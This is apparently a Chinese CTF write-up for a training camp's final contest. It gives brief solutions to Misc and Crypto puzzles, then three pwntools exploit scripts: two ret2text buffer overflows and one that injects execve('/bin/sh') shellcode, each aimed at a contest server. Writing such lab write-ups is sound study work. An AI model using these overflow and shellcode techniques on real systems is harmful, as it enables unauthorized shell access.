---
title: 暑假训练营结营赛WP
date: '2025-09-06 12:13:54'
updated: '2025-09-20 17:23:50'
---
## Misc
### QR.png
把二维码拼回去扫出来就是 flag 内容

### Stuxnet
jpg 文件丢到随波逐流解码直接获得 flag

### Webshell
pcapng 文件直接丢随波逐流解码获得 flag

### 你会用 word 吗？
打开 word 文件可以看见图片底下藏了第一部分，还有一部分通过 binwalk 可以扫出来一张照片，打开就可以看见第二部分的 flag

![](/images/755ea0299e702a41ffa976bef40bb20a.png)

![](/images/2b9330526f3d9e0fd38b61c863796351.png)

### 有趣的编码
先根据提示用栅栏解密出后面带两个=的类似 base64 的东西，然后 base64 解密就得到 flag 了

## Crypto
### 凯撒
先用 base 解密然后再用凯撒解密得到 flag

### morse
摩斯密码解密换成小写就是 flag 了

## Pwn
### expwn
ret2text

exp：

```python
#!/usr/bin/env python3

from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

# link=process("./ezpwn")
link=remote('193.112.147.47',32890)

link.recvuntil(b'Let us know your message!')
link.sendline(b'a'*0x18+p64(0x000000000040122D))
link.interactive()
```

### password
ret2text

exp：

```python
#!/usr/bin/env python3

from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

# link=process("./password")
link=remote('193.112.147.47',33094)

link.recvuntil(b'input your password to unlock the system!')
link.sendline(b'a'*0x28+p64(0x0000000000401288))

link.interactive()
```

### syscall
shellcode 题

exp：

```python
#!/usr/bin/env python3

from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

link=process("./syscall")
link=remote('193.112.147.47',33103)
elf=ELF("./heap")

# gdb.attach(link)
# pause()

link.recvuntil(b'the only thing is call!')
shellcode=asm('''
    mov rax, 0x3b
    movabs rdi, 0x68732f6e69622f
    push   rdi
    push   rsp
    pop    rdi
    xor    rsi, rsi
    xor    rdx, rdx
    syscall
''')
link.sendline(shellcode)

link.interactive()
```

